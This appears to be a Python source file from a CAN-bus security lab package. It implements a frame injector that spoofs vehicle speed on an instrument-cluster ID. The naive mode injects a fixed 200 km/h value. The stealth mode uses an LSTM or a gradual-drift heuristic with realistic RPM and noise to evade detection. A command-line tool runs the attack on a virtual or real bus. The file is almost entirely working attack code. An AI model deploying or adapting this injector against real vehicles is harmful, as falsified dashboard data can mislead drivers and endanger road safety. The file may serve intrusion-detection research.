"""Injecteur de frames CAN — Naïf et Stealth.

Deux modes d'attaque :
1. Naïf : injection directe de frames avec des valeurs arbitraires
2. Stealth : utilise le LSTM + optimiseur pour générer des frames furtives
"""

from __future__ import annotations

import asyncio
import logging
import struct
import time
from enum import Enum
from typing import Any

import can
import numpy as np

from canlab.config import (
    CAN_BUSTYPE,
    CAN_INTERFACE,
    USE_VIRTUAL_BUS,
    ECU_CLUSTER,
)

logger = logging.getLogger(__name__)


class AttackMode(str, Enum):
    NAIVE = "naive"
    STEALTH = "stealth"


class CANInjector:
    """Injecteur de frames CAN sur le bus."""

    def __init__(self, bus: can.BusABC | None = None) -> None:
        self.bus = bus
        self._running = False
        self._attack_mode: AttackMode = AttackMode.NAIVE
        self._target_id: int = ECU_CLUSTER.arb_id
        self._target_speed_kmh: float = 200.0
        self._frame_count: int = 0
        self._lstm_model: Any = None
        self._frame_buffer: list[np.ndarray] = []

    def connect(self) -> None:
        """Connecte au bus CAN."""
        if self.bus is not None:
            return
        if USE_VIRTUAL_BUS:
            self.bus = can.Bus(interface="virtual", channel="vcan_sim")
        else:
            self.bus = can.Bus(interface=CAN_BUSTYPE, channel=CAN_INTERFACE)
        logger.info("🔌 Injecteur connecté au bus CAN")

    def disconnect(self) -> None:
        """Déconnecte du bus CAN."""
        self._running = False
        if self.bus is not None:
            self.bus.shutdown()
            self.bus = None

    # ──────────────────────────────────────────────
    # Attaque naïve
    # ──────────────────────────────────────────────
    def craft_naive_frame(self) -> can.Message:
        """Crée une frame naïve avec une vitesse falsifiée."""
        speed_raw = int(self._target_speed_kmh * 100)
        rpm_fake = 3000
        payload = struct.pack(">HHBxxx", speed_raw, rpm_fake, 0)
        return can.Message(
            arbitration_id=self._target_id,
            data=payload,
            is_extended_id=False,
        )

    # ──────────────────────────────────────────────
    # Attaque stealth (LSTM)
    # ──────────────────────────────────────────────
    def load_stealth_model(self) -> None:
        """Charge le modèle LSTM pour l'attaque stealth."""
        try:
            from canlab.attack.mimic_model import load_mimic_model

            self._lstm_model = load_mimic_model()
            logger.info("🧠 Modèle LSTM chargé pour attaque stealth")
        except Exception as e:
            logger.warning("⚠️ Impossible de charger le modèle LSTM: %s", e)
            logger.info("💡 Utilisation du mode stealth simplifié")
            self._lstm_model = None

    def craft_stealth_frame(self) -> can.Message:
        """Crée une frame stealth en utilisant le LSTM ou une heuristique.

        La frame ressemble au trafic normal mais encode une vitesse falsifiée.
        """
        if self._lstm_model is not None and len(self._frame_buffer) >= 50:
            # Utiliser le LSTM
            sequence = np.array(self._frame_buffer[-50:], dtype=np.float32) / 255.0
            generated = self._lstm_model.generate_frame(sequence)
            # Modifier subtilement la vitesse dans le payload généré
            speed_raw = int(self._target_speed_kmh * 100)
            generated[0] = (speed_raw >> 8) & 0xFF
            generated[1] = speed_raw & 0xFF
            payload = bytes(generated[:8].tolist())
        else:
            # Mode stealth simplifié : frame quasi-normale avec drift progressif
            base_speed = 60.0  # Vitesse de base normale
            # Drift progressif vers la vitesse cible
            progress = min(1.0, self._frame_count / 100.0)
            current_speed = base_speed + progress * (self._target_speed_kmh - base_speed)

            speed_raw = int(current_speed * 100)
            rpm = int(800 + current_speed * 25)  # RPM cohérent
            noise = np.random.default_rng().integers(0, 5)

            payload = struct.pack(
                ">HHBBxx",
                speed_raw,
                rpm + noise,
                int(0.3 * 100),  # throttle normal
                int(0.2 * 100),  # load normal
            )

        return can.Message(
            arbitration_id=self._target_id,
            data=payload,
            is_extended_id=False,
        )

    # ──────────────────────────────────────────────
    # Injection
    # ──────────────────────────────────────────────
    def inject_frame(self) -> can.Message | None:
        """Injecte une frame selon le mode d'attaque actif."""
        if self._attack_mode == AttackMode.NAIVE:
            msg = self.craft_naive_frame()
        else:
            msg = self.craft_stealth_frame()

        if self.bus is not None:
            try:
                self.bus.send(msg)
                self._frame_count += 1
            except can.CanError as e:
                logger.warning("Injection error: %s", e)
                return None
        else:
            self._frame_count += 1

        return msg

    def observe_frame(self, msg: can.Message) -> None:
        """Observe une frame du bus (pour alimenter le buffer LSTM)."""
        payload = np.frombuffer(msg.data, dtype=np.uint8).copy()
        if len(payload) < 8:
            payload = np.pad(payload, (0, 8 - len(payload)))
        self._frame_buffer.append(payload)
        # Garder seulement les 200 dernières frames
        if len(self._frame_buffer) > 200:
            self._frame_buffer = self._frame_buffer[-200:]

    async def run_attack(
        self,
        mode: AttackMode = AttackMode.NAIVE,
        target_id: int = ECU_CLUSTER.arb_id,
        target_speed: float = 200.0,
        duration_s: float = 30.0,
        period_ms: float | None = None,
    ) -> dict:
        """Lance une attaque pour une durée donnée.

        Args:
            mode: naive ou stealth
            target_id: ID CAN cible
            target_speed: vitesse à injecter (km/h)
            duration_s: durée de l'attaque
            period_ms: période d'injection (None = fréquence nominale de l'ID cible)
        """
        self._attack_mode = mode
        self._target_id = target_id
        self._target_speed_kmh = target_speed
        self._frame_count = 0
        self._running = True

        if mode == AttackMode.STEALTH:
            self.load_stealth_model()

        if period_ms is None:
            from canlab.config import ECU_BY_ID
            ecu_def = ECU_BY_ID.get(target_id)
            period_ms = ecu_def.period_ms if ecu_def else 100.0

        self.connect()
        logger.info(
            "⚔️ Attaque %s démarrée — ID=0x%03X, Vitesse=%.0f km/h, Période=%dms",
            mode.value,
            target_id,
            target_speed,
            period_ms,
        )

        t_start = time.monotonic()
        try:
            while self._running and (time.monotonic() - t_start) < duration_s:
                self.inject_frame()
                await asyncio.sleep(period_ms / 1000.0)
        except KeyboardInterrupt:
            pass
        finally:
            self._running = False

        result = {
            "mode": mode.value,
            "target_id": hex(target_id),
            "target_speed": target_speed,
            "frames_injected": self._frame_count,
            "duration_s": time.monotonic() - t_start,
        }
        logger.info("✅ Attaque terminée — %d frames injectées", self._frame_count)
        return result

    def stop(self) -> None:
        """Arrête l'attaque en cours."""
        self._running = False
        logger.info("⛔ Attaque arrêtée")


# ──────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────
def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(description="CAN Frame Injector")
    parser.add_argument(
        "--mode", choices=["naive", "stealth"], default="naive"
    )
    parser.add_argument("--target-id", type=lambda x: int(x, 16), default=0x130)
    parser.add_argument("--speed", type=float, default=200.0)
    parser.add_argument("--duration", type=float, default=30.0)
    parser.add_argument("--virtual", action="store_true")
    args = parser.parse_args()

    if args.virtual:
        import canlab.config as cfg
        cfg.USE_VIRTUAL_BUS = True
        cfg.CAN_BUSTYPE = "virtual"

    logging.basicConfig(level=logging.INFO)
    injector = CANInjector()
    asyncio.run(
        injector.run_attack(
            mode=AttackMode(args.mode),
            target_id=args.target_id,
            target_speed=args.speed,
            duration_s=args.duration,
        )
    )


if __name__ == "__main__":
    main()
